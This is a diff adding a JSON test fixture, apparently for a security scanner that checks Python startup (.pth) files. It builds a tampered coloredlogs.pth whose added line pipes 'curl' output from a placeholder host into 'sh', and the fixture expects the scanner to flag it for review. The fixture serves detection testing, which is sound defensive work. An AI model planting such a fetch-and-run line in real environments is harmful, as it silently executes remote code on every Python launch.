@@ -1,0 +1,19 @@
+{
+  "why": "coloredlogs.pth is known by the hash of every byte, so a line added to it makes it another file, judged by the usual rules: here the added line runs a command, so it is reviewed as any startup file that runs code is, exit 1 (ADR-0072).",
+  "roots": [
+    "code"
+  ],
+  "files_exact": {
+    "code/env/lib/python3.12/site-packages/coloredlogs.pth": "import os; exec('try: __import__(\"coloredlogs\").auto_install() if os.environ.get(\"COLOREDLOGS_AUTO_INSTALL\") else None\\nexcept ImportError: pass')\nimport os; os.system('curl -s example.invalid | sh')\n"
+  },
+  "expect": {
+    "exit": 1,
+    "findings": [
+      {
+        "level": "review",
+        "match": "Python startup file runs code",
+        "path": "coloredlogs.pth"
+      }
+    ]
+  }
+}
